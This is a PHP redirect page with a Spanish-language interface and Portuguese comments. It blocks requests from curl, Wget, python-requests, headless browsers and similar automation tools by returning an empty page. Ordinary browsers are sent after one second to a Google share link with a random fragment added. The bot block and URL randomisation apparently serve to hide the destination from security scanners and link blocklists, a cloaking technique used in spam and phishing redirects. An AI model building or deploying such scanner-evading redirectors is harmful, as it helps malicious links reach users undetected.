<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// 1. Bloqueio básico para ferramentas de automação e scrapers
$bot_agents = [
    'curl', 'python-requests', 'Go-http-client',
    'Wget', 'libwww-perl', 'HeadlessChrome', 'Puppeteer'
];

foreach ($bot_agents as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        http_response_code(200);
        exit;
    }
}

// 2. Configurações e Geração do Hash Randômico
$baseUrl = 'https://share.google/yoCsKYCPdA1ESpC2N#';

function generateSegment(int $length = 12): string {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $result = '';
    $max = strlen($chars) - 1;
    for ($i = 0; $i < $length; $i++) {
        $result .= $chars[random_int(0, $max)];
    }
    return $result;
}

// Monta a URL limpa com um segmento randômico
$randomUrl  = $baseUrl . generateSegment(12);
$waitSeconds = 1;
?>
<!DOCTYPE html>
<html lang="es-419">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>Cargando...</title>
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body {
    height: 100%;
    background: #fff;
    font-family: sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    flex-direction: column;
    gap: 12px;
}
.progress-wrap {
    width: 260px;
    background: #ede9e3;
    border-radius: 1px;
    height: 1px;
    overflow: hidden;
}
.progress-bar {
    height: 100%;
    width: 0%;
    background: #1a4a7a;
    border-radius: 1px;
    transition: width linear;
}
.counter {
    font-size: .85rem;
    color: #6b6560;
}
.counter strong {
    color: #1a4a7a;
    font-weight: 600;
}
</style>
</head>
<body>
<div class="progress-wrap">
    <div class="progress-bar" id="pbar"></div>
</div>
<p class="counter">Redireccionando en <strong id="cnt"><?php echo $waitSeconds; ?></strong> segundo<?php echo $waitSeconds !== 1 ? 's' : ''; ?>…</p>
<script>
(function() {
    var wait = <?php echo $waitSeconds; ?> * 1000;
    var url  = <?php echo json_encode($randomUrl); ?>;
    var bar  = document.getElementById('pbar');
    var cnt  = document.getElementById('cnt');
    var start = performance.now();

    bar.style.transition = 'width ' + (wait / 1000) + 's linear';
    requestAnimationFrame(function() {
        requestAnimationFrame(function() {
            bar.style.width = '100%';
        });
    });

    var interval = setInterval(function() {
        var elapsed = performance.now() - start;
        var remaining = Math.ceil((wait - elapsed) / 1000);
        if (remaining < 1) remaining = 1;
        cnt.textContent = remaining;
    }, 200);

    setTimeout(function() {
        clearInterval(interval);
        window.location.replace(url);
    }, wait);
})();
</script>
</body>
</html>
